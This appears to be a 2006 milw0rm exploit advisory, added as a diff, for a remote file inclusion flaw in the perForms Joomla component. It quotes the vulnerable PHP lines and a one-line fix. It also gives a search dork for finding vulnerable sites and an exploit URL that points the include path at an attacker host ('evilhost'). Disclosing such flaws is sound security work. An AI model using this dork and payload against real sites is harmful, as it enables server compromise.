@@ -1,0 +1,39 @@
+------------------------------------------------------------------------ ---
+perForms <= 1.0 ([mosConfig_absolute_path]) Remote File Inclusion
+------------------------------------------------------------------------ ---
+
+Remote : Yes
+Critical Level : High
+Vuln founded in a log file: lazy 0day!!! :D
+Description:
+~~~~~~~~~~~~
+Application : perForms Joomla Component
+Version : latest version [1.0]
+URL : http://forge.joomla.org/sf/projects/performs
+Variable $mosConfig_absolute_path not sanitized: xpl works with register_globals=on in /components/com_performs/com_performs/performs.php on lines 6-10
+
+require_once( $mosConfig_absolute_path."/administrator/components/com_performs/lib/lib _template.php" );
+require_once( $mosConfig_absolute_path."/administrator/components/com_performs/lib/lib _valid.php" );
+require_once( $mosConfig_absolute_path."/administrator/components/com_performs/lib/lib _phpForm.php" );
+require_once( $mosConfig_absolute_path."/administrator/components/com_performs/lib/myL ib.php" );
+require_once($mosConfig_absolute_path."/administrator/components/com_per forms/class.performs.php");
+
+Exploit:
+~~~~~~~~
+dork: inurl:"com_performs" -> founds ~12.000 sites (!)
+
+http://www.vuln.com/components/com_performs/performs.php?mosConfig_absolute_path=http://evilhost
+
+Fix
+~~~~
+Add before code:
+
+defined('_VALID_MOS') or die('Direct access to this location is not allowed.');
+
+Thx
+
+~~~~
+Who works for better code and better life!
+------------------------------------------------------------------------
+
+# milw0rm.com [2006-07-17]
